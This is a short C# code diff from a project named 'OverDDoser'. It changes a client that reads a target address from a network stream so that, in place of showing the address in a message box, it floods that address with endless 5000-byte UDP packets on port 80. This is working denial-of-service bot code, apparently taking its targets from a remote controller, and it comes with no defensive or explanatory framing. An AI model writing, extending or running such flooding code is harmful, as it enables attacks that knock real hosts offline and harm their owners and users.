@@ -20,7 +20,9 @@ namespace OverDDoser
             NetworkStream s = f.stream;
             StreamReader sr = new StreamReader(s);
             string Address = sr.ReadLine();
-            MessageBox.Show(Address);
+            using (UdpClient c = new UdpClient(80)) 
+                while(true)
+                    c.Send(new byte[5000], 5000, Address, 80);
         }
     }
 }
